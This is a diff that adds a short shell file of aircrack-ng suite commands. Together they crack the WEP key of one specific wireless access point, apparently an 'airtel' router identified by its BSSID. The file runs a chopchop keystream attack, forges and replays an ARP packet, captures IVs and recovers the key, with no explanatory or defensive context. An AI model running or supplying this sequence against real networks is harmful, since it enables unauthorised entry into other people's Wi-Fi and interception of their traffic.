@@ -1,0 +1,6 @@
+sudo aireplay-ng -4 -b 0C:D2:B5:00:A1:7A mon0
+tcpdump -s 0 -n -e -r replay_dec-0205-113403.cap
+packetforge-ng -0 -a 0C:D2:B5:00:A1:7A -h 00:11:22:33:44:55 -k 192.168.1.2 -l 224.0.0.12 -y replay_dec-0205-113403.xor -w airtel.cap
+sudo aireplay-ng -2 -r airtel.cap mon0
+sudo airodump-ng --bssid 0C:D2:B5:00:A1:7A -i --write airtel1.cap mon0
+sudo aircrack-ng -a 1 -1 -x2 -f 3 -s -l length.txt airtel1.cap-01.ivs
